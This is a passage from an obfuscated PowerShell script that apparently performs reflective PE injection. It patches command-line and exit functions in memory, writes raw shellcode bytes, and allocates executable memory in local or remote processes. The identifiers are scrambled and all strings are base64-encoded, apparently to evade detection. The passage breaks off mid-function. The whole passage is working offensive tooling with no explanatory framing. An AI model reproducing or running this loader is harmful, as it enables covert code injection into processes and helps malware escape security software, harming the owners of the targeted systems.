		_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/\/==\_/=\_/\___} -_/=\/\/===\_/=\__/ ${_/=\_/\/=\____/\/}
		${_/=\_/\/=\____/\/} = ____/\/===\__/\/== ${_/=\_/\/=\____/\/} (${_/\/==\_/=\_/\___}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/==\/=\/\_/===\_/}, ${_/=\_/\/=\____/\/}, $false)
		${_/=\_/\/=\____/\/} = ____/\/===\__/\/== ${_/=\_/\/=\____/\/} ${_/===\/\_/=\_/\_/}
		_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/\/=\/=\/===\_/\} -_/=\/\/===\_/=\__/ ${_/=\_/\/=\____/\/}
		$Win32Functions.VirtualProtect.Invoke(${_________/\_/=\_/}, [UInt32]${___/\/\/=\/\/\_/=}, [UInt32]${_/\_/=\_/=====\__}, [Ref]${_/\_/=\_/=====\__}) | Out-Null
		[UInt32]${_/\_/=\_/=====\__} = 0
		${__/==\_/======\/=} = $Win32Functions.VirtualProtect.Invoke(${/=\_/=\/\_/=\__/=}, [UInt32]${___/\/\/=\/\/\_/=}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${_/\_/=\_/=====\__})
		if (${__/==\_/======\/=} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${_/\_/\/\___/=====} = ${/=\_/=\/\_/=\__/=}
		_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/\/==\_/=\_/\___} -_/=\/\/===\_/=\__/ ${_/\_/\/\___/=====}
		${_/\_/\/\___/=====} = ____/\/===\__/\/== ${_/\_/\/\___/=====} (${_/\/==\_/=\_/\___}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/===\_/==\_/\/=\}, ${_/\_/\/\___/=====}, $false)
		${_/\_/\/\___/=====} = ____/\/===\__/\/== ${_/\_/\/\___/=====} ${_/===\/\_/=\_/\_/}
		_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/\/=\/=\/===\_/\} -_/=\/\/===\_/=\__/ ${_/\_/\/\___/=====}
		$Win32Functions.VirtualProtect.Invoke(${/=\_/=\/\_/=\__/=}, [UInt32]${___/\/\/=\/\/\_/=}, [UInt32]${_/\_/=\_/=====\__}, [Ref]${_/\_/=\_/=====\__}) | Out-Null
		${_____/\/==\_/\/==} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach (${_/\/=\____/=====\} in ${_____/\/==\_/\/==})
		{
			[IntPtr]${_/=\__/=\/=\/\/==} = $Win32Functions.GetModuleHandle.Invoke(${_/\/=\____/=====\})
			if (${_/=\__/=\/=\/\/==} -ne [IntPtr]::Zero)
			{
				[IntPtr]${_/=\_/==\/===\/==} = $Win32Functions.GetProcAddress.Invoke(${_/=\__/=\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]${/=\__/=\/===\/\/=} = $Win32Functions.GetProcAddress.Invoke(${_/=\__/=\/=\/\/==}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if (${_/=\_/==\/===\/==} -eq [IntPtr]::Zero -or ${/=\__/=\/===\/\/=} -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${_/\___/=\/\___/\/} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${___/\_/\___/\_/\/=})
				${___/\_/=\___/\_/\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${___/\_/\___/\_/\/=})
				${_/===\/\/=\/\__/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/=\__/=\/===\/\/=}, [Type][IntPtr])
				${_/==\_/==\/=\/=\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\_/==\/===\/==}, [Type][IntPtr])
				${/=====\/\_/==\_/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/===\/\_/=\_/\_/})
				${____/\__/===\_/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${_/===\/\_/=\_/\_/})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/===\/\/=\/\__/\}, ${/=====\/\_/==\_/=}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/==\_/==\/=\/=\/}, ${____/\__/===\_/\/}, $false)
				${_/\__/===\__/====} += ,(${/=\__/=\/===\/\/=}, ${/=====\/\_/==\_/=}, ${_/===\/\_/=\_/\_/})
				${_/\__/===\__/====} += ,(${_/=\_/==\/===\/==}, ${____/\__/===\_/\/}, ${_/===\/\_/=\_/\_/})
				${__/==\_/======\/=} = $Win32Functions.VirtualProtect.Invoke(${/=\__/=\/===\/\/=}, [UInt32]${_/===\/\_/=\_/\_/}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${_/\_/=\_/=====\__})
				if (${__/==\_/======\/=} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\___/=\/\___/\/}, ${/=\__/=\/===\/\/=}, $false)
				$Win32Functions.VirtualProtect.Invoke(${/=\__/=\/===\/\/=}, [UInt32]${_/===\/\_/=\_/\_/}, [UInt32](${_/\_/=\_/=====\__}), [Ref]${_/\_/=\_/=====\__}) | Out-Null
				${__/==\_/======\/=} = $Win32Functions.VirtualProtect.Invoke(${_/=\_/==\/===\/==}, [UInt32]${_/===\/\_/=\_/\_/}, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]${_/\_/=\_/=====\__})
				if (${__/==\_/======\/=} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/\_/=\___/\_/\}, ${_/=\_/==\/===\/==}, $false)
				$Win32Functions.VirtualProtect.Invoke(${_/=\_/==\/===\/==}, [UInt32]${_/===\/\_/=\_/\_/}, [UInt32](${_/\_/=\_/=====\__}), [Ref]${_/\_/=\_/=====\__}) | Out-Null
			}
		}
		${_/\__/===\__/====} = @()
		${/=\/\/=\/\/===\/=} = @() 
		[IntPtr]${/=\_/=\_/=\_/=\/\} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAuAGQAbABsAA=='))))
		if (${/=\_/=\_/=\_/=\/\} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGMAbwByAGUAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		[IntPtr]${/=\/=\/\/=\__/\__} = $Win32Functions.GetProcAddress.Invoke(${/=\_/=\_/=\_/=\/\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${/=\/=\/\/=\__/\__} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHIARQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${/=\/\/=\/\/===\/=} += ${/=\/=\/\/=\__/\__}
		[IntPtr]${_____/==\/==\_/\_} = $Win32Functions.GetProcAddress.Invoke(${/=\_/\/=\/\_____/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzAA=='))))
		if (${_____/==\/==\_/\_} -eq [IntPtr]::Zero)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABQAHIAbwBjAGUAcwBzACAAYQBkAGQAcgBlAHMAcwAgAG4AbwB0ACAAZgBvAHUAbgBkAA==')))
		}
		${/=\/\/=\/\/===\/=} += ${_____/==\/==\_/\_}
		[UInt32]${_/\_/=\_/=====\__} = 0
		foreach (${/=\___/=\_/\/\_/=} in ${/=\/\/=\/\/===\/=})
		{
			${_/\/====\/==\/==\} = ${/=\___/=\_/\/\_/=}
			[Byte[]]${_/\/==\_/=\_/\___} = @(0xbb)
			[Byte[]]${_/\/=\/=\/===\_/\} = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
			if (${_/===\/\_/=\_/\_/} -eq 8)
			{
				[Byte[]]${_/\/==\_/=\_/\___} = @(0x48, 0xbb)
				[Byte[]]${_/\/=\/=\/===\_/\} = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
			}
			[Byte[]]${__/==\/=\/\______} = @(0xff, 0xd3)
			${___/\/\/=\/\/\_/=} = ${_/\/==\_/=\_/\___}.Length + ${_/===\/\_/=\_/\_/} + ${_/\/=\/=\/===\_/\}.Length + ${_/===\/\_/=\_/\_/} + ${__/==\/=\/\______}.Length
			[IntPtr]${__/\____/===\/\/\} = $Win32Functions.GetProcAddress.Invoke(${/=\_/\/=\/\_____/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAA='))))
			if (${__/\____/===\/\/\} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQB4AGkAdABUAGgAcgBlAGEAZAAgAGEAZABkAHIAZQBzAHMAIABuAG8AdAAgAGYAbwB1AG4AZAA=')))
			}
			${__/==\_/======\/=} = $Win32Functions.VirtualProtect.Invoke(${/=\___/=\_/\/\_/=}, [UInt32]${___/\/\/=\/\/\_/=}, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${_/\_/=\_/=====\__})
			if (${__/==\_/======\/=} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			${_____/\_/\_/\/===} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${___/\/\/=\/\/\_/=})
			$Win32Functions.memcpy.Invoke(${_____/\_/\_/\/===}, ${/=\___/=\_/\/\_/=}, [UInt64]${___/\/\/=\/\/\_/=}) | Out-Null
			${_/\__/===\__/====} += ,(${/=\___/=\_/\/\_/=}, ${_____/\_/\_/\/===}, ${___/\/\/=\/\/\_/=})
			_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/\/==\_/=\_/\___} -_/=\/\/===\_/=\__/ ${_/\/====\/==\/==\}
			${_/\/====\/==\/==\} = ____/\/===\__/\/== ${_/\/====\/==\/==\} (${_/\/==\_/=\_/\___}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${____/\/\/==\_/=\/\}, ${_/\/====\/==\/==\}, $false)
			${_/\/====\/==\/==\} = ____/\/===\__/\/== ${_/\/====\/==\/==\} ${_/===\/\_/=\_/\_/}
			_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${_/\/=\/=\/===\_/\} -_/=\/\/===\_/=\__/ ${_/\/====\/==\/==\}
			${_/\/====\/==\/==\} = ____/\/===\__/\/== ${_/\/====\/==\/==\} (${_/\/=\/=\/===\_/\}.Length)
			[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\____/===\/\/\}, ${_/\/====\/==\/==\}, $false)
			${_/\/====\/==\/==\} = ____/\/===\__/\/== ${_/\/====\/==\/==\} ${_/===\/\_/=\_/\_/}
			_/=\_/==\__/\/==\/ -___/\/\__/=\_/\_/\ ${__/==\/=\/\______} -_/=\/\/===\_/=\__/ ${_/\/====\/==\/==\}
			$Win32Functions.VirtualProtect.Invoke(${/=\___/=\_/\/\_/=}, [UInt32]${___/\/\/=\/\/\_/=}, [UInt32]${_/\_/=\_/=====\__}, [Ref]${_/\_/=\_/=====\__}) | Out-Null
		}
		echo ${_/\__/===\__/====}
	}
	Function ___/\_/\/\/=\/=\/=
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Array[]]
		${___/=\/=\__/\/\__/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Functions,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		[UInt32]${_/\_/=\_/=====\__} = 0
		foreach (${/==\__/\/\/===\__} in ${___/=\/=\__/\/\__/})
		{
			${__/==\_/======\/=} = $Win32Functions.VirtualProtect.Invoke(${/==\__/\/\/===\__}[0], [UInt32]${/==\__/\/\/===\__}[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]${_/\_/=\_/=====\__})
			if (${__/==\_/======\/=} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
			}
			$Win32Functions.memcpy.Invoke(${/==\__/\/\/===\__}[0], ${/==\__/\/\/===\__}[1], [UInt64]${/==\__/\/\/===\__}[2]) | Out-Null
			$Win32Functions.VirtualProtect.Invoke(${/==\__/\/\/===\__}[0], [UInt32]${/==\__/\/\/===\__}[2], [UInt32]${_/\_/=\_/=====\__}, [Ref]${_/\_/=\_/=====\__}) | Out-Null
		}
	}
	Function __/===\__/\/\__/\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		${__/\/=\_/====\_/=\},
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		${_/==\/==\____/==\_}
		)
		$Win32Types = __/\_/\/==\__/\_/=
		$Win32Constants = __/===\/====\/\/\_
		${__/\/==\_/\_/\_/\_} = __/==\_/==\__/==\_ -__/\/=\_/====\_/=\ ${__/\/=\_/====\_/=\} -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		${_/=\/\_/=\_______} = ____/\/===\__/\/== (${__/\/=\_/====\_/=\}) (${__/\/==\_/\_/\_/\_}.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		${______/===\_/\___} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\/\_/=\_______}, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		for (${__/\_/\/=\/======} = 0; ${__/\_/\/=\/======} -lt ${______/===\_/\___}.NumberOfNames; ${__/\_/\/=\/======}++)
		{
			${__/=======\/=\/\_} = ____/\/===\__/\/== (${__/\/=\_/====\_/=\}) (${______/===\_/\___}.AddressOfNames + (${__/\_/\/=\/======} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			${/=\/===\__/==\__/} = ____/\/===\__/\/== (${__/\/=\_/====\_/=\}) ([System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=======\/=\/\_}, [Type][UInt32]))
			${_____/=\/\/\_/=\/} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${/=\/===\__/==\__/})
			if (${_____/=\/\/\_/=\/} -ceq ${_/==\/==\____/==\_})
			{
				${_/\____/\_/=\/=\_} = ____/\/===\__/\/== (${__/\/=\_/====\_/=\}) (${______/===\_/\___}.AddressOfNameOrdinals + (${__/\_/\/=\/======} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				${/=\_____/=\____/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\____/\_/=\/=\_}, [Type][UInt16])
				${____/=\/==\_/\/=\} = ____/\/===\__/\/== (${__/\/=\_/====\_/=\}) (${______/===\_/\___}.AddressOfFunctions + (${/=\_____/=\____/=} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				${_/==\/=\/\/=\/\__} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${____/=\/==\_/\/=\}, [Type][UInt32])
				return ____/\/===\__/\/== (${__/\/=\_/====\_/=\}) (${_/==\/=\/\/=\/\__})
			}
		}
		return [IntPtr]::Zero
	}
	Function __/\_/\/===\/==\_/
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		${__/\/\/\/\/\/\_/\_},
		[Parameter(Position = 1, Mandatory = $false)]
		[String]
		${_/=\__/\/\/=\_/\/\},
		[Parameter(Position = 2, Mandatory = $false)]
		[IntPtr]
		${__/\/=====\/==\___},
        [Parameter(Position = 3)]
        [Bool]
        ${___/==\/\/\/\_____} = $false
		)
		${_/===\/\_/=\_/\_/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$Win32Constants = __/===\/====\/\/\_
		$Win32Functions = __/\/======\/==\/\
		$Win32Types = __/\_/\/==\__/\_/=
		${__/\_/==\_/\/====} = $false
		if ((${__/\/=====\/==\___} -ne $null) -and (${__/\/=====\/==\___} -ne [IntPtr]::Zero))
		{
			${__/\_/==\_/\/====} = $true
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGIAYQBzAGkAYwAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGYAaQBsAGUA')))
		${__/\/==\_/\_/\_/\_} = _/===\/=\/\_/====\ -__/\/\/\/\/\/\_/\_ ${__/\/\/\/\/\/\_/\_} -Win32Types $Win32Types
		${_/==\/=\/\__/\/\/\} = ${__/\/==\_/\_/\_/\_}.OriginalImageBase
		${/=\_/\/==\/==\/\_} = $true
		if (([Int] ${__/\/==\_/\_/\_/\_}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAaQBzACAAbgBvAHQAIABjAG8AbQBwAGEAdABpAGIAbABlACAAdwBpAHQAaAAgAEQARQBQACwAIABtAGkAZwBoAHQAIABjAGEAdQBzAGUAIABpAHMAcwB1AGUAcwA='))) -WarningAction Continue
			${/=\_/\/==\/==\/\_} = $false
		}
		${/==\__/=\__/\/\_/} = $true
		if (${__/\_/==\_/\/====} -eq $true)
		{
			${/=\_/\/=\/\_____/} = $Win32Functions.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('awBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
			${/==\/\___/\__/\__} = $Win32Functions.GetProcAddress.Invoke(${/=\_/\/=\/\_____/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBzAFcAbwB3ADYANABQAHIAbwBjAGUAcwBzAA=='))))
			if (${/==\/\___/\__/\__} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbABvAGMAYQB0AGUAIABJAHMAVwBvAHcANgA0AFAAcgBvAGMAZQBzAHMAIABmAHUAbgBjAHQAaQBvAG4AIAB0AG8AIABkAGUAdABlAHIAbQBpAG4AZQAgAGkAZgAgAHQAYQByAGcAZQB0ACAAcAByAG8AYwBlAHMAcwAgAGkAcwAgADMAMgBiAGkAdAAgAG8AcgAgADYANABiAGkAdAA=')))
			}
			[Bool]${_/\__/\__/=\__/=\} = $false
			${__/==\_/======\/=} = $Win32Functions.IsWow64Process.Invoke(${__/\/=====\/==\___}, [Ref]${_/\__/\__/=\__/=\})
			if (${__/==\_/======\/=} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEkAcwBXAG8AdwA2ADQAUAByAG8AYwBlAHMAcwAgAGYAYQBpAGwAZQBkAA==')))
			}
			if ((${_/\__/\__/=\__/=\} -eq $true) -or ((${_/\__/\__/=\__/=\} -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				${/==\__/=\__/\/\_/} = $false
			}
			${__/=\/\/=\_/\__/\} = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${__/=\/\/=\_/\__/\} = $false
			}
			if (${__/=\/\/=\_/\__/\} -ne ${/==\__/=\__/\/\_/})
			{
				throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFMAaABlAGwAbAAgAG0AdQBzAHQAIABiAGUAIABzAGEAbQBlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIAAoAHgAOAA2AC8AeAA2ADQAKQAgAGEAcwAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAYQBuAGQAIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMAZQBzAHMA')))
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				${/==\__/=\__/\/\_/} = $false
			}
		}
		if (${/==\__/=\__/\/\_/} -ne ${__/\/==\_/\_/\_/\_}.PE64Bit)
		{
			Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAcABsAGEAdABmAG8AcgBtACAAZABvAGUAcwBuACcAdAAgAG0AYQB0AGMAaAAgAHQAaABlACAAYQByAGMAaABpAHQAZQBjAHQAdQByAGUAIABvAGYAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABpAHQAIABpAHMAIABiAGUAaQBuAGcAIABsAG8AYQBkAGUAZAAgAGkAbgAgACgAMwAyAC8ANgA0AGIAaQB0ACkA')))
		}
		Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAGEAdABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIAB0AGgAZQAgAFAARQAgAGEAbgBkACAAdwByAGkAdABlACAAaQB0AHMAIABoAGUAYQBkAGUAcgBzACAAdABvACAAbQBlAG0AbwByAHkA')))
		[IntPtr]${_/=\/\_/\_/\__/\/} = [IntPtr]::Zero
        ${______/==\_/\/=\/} = ([Int] ${__/\/==\_/\_/\_/\_}.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
		if ((-not ${___/==\/\/\/\_____}) -and (-not ${______/==\_/\/=\/}))
		{
			Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGIAZQBpAG4AZwAgAHIAZQBmAGwAZQBjAHQAaQB2AGUAbAB5ACAAbABvAGEAZABlAGQAIABpAHMAIABuAG8AdAAgAEEAUwBMAFIAIABjAG8AbQBwAGEAdABpAGIAbABlAC4AIABJAGYAIAB0AGgAZQAgAGwAbwBhAGQAaQBuAGcAIABmAGEAaQBsAHMALAAgAHQAcgB5ACAAcgBlAHMAdABhAHIAdABpAG4AZwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABhAG4AZAAgAHQAcgB5AGkAbgBnACAAYQBnAGEAaQBuACAATwBSACAAdAByAHkAIAB1AHMAaQBuAGcAIAB0AGgAZQAgAC0ARgBvAHIAYwBlAEEAUwBMAFIAIABmAGwAYQBnACAAKABjAG8AdQBsAGQAIABjAGEAdQBzAGUAIABjAHIAYQBzAGgAZQBzACkA'))) -WarningAction Continue
			[IntPtr]${_/=\/\_/\_/\__/\/} = ${_/==\/=\/\__/\/\/\}
		}
        elseif (${___/==\/\/\/\_____} -and (-not ${______/==\_/\/=\/}))
        {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAQQBTAEwAUgAgAGIAdQB0ACAALQBGAG8AcgBjAGUAQQBTAEwAUgAgAGkAcwAgAHMAZQB0AC4AIABGAG8AcgBjAGkAbgBnACAAQQBTAEwAUgAgAG8AbgAgAHQAaABlACAAUABFACAAZgBpAGwAZQAuACAAVABoAGkAcwAgAGMAbwB1AGwAZAAgAHIAZQBzAHUAbAB0ACAAaQBuACAAYQAgAGMAcgBhAHMAaAAuAA==')))
        }
        if (${___/==\/\/\/\_____} -and ${__/\_/==\_/\/====})
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIAB1AHMAZQAgAEYAbwByAGMAZQBBAFMATABSACAAdwBoAGUAbgAgAGwAbwBhAGQAaQBuAGcAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4A'))) -ErrorAction Stop
        }
        if (${__/\_/==\_/\/====} -and (-not ${______/==\_/\/=\/}))
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSAC4AIABDAGEAbgBuAG8AdAAgAGwAbwBhAGQAIABhACAAbgBvAG4ALQBBAFMATABSACAAUABFACAAaQBuACAAdABvACAAYQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwA='))) -ErrorAction Stop
        }
		${__/\/=\_/====\_/=\} = [IntPtr]::Zero				
		${__/==\/===\/\/\__} = [IntPtr]::Zero		
		if (${__/\_/==\_/\/====} -eq $true)
		{
			${__/\/=\_/====\_/=\} = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${__/\/==\_/\_/\_/\_}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			${__/==\/===\/\/\__} = $Win32Functions.VirtualAllocEx.Invoke(${__/\/=====\/==\___}, ${_/=\/\_/\_/\__/\/}, [UIntPtr]${__/\/==\_/\_/\_/\_}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if (${__/==\/===\/\/\__} -eq [IntPtr]::Zero)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
			}
		}
		else
		{
			if (${/=\_/\/==\/==\/\_} -eq $true)
			{
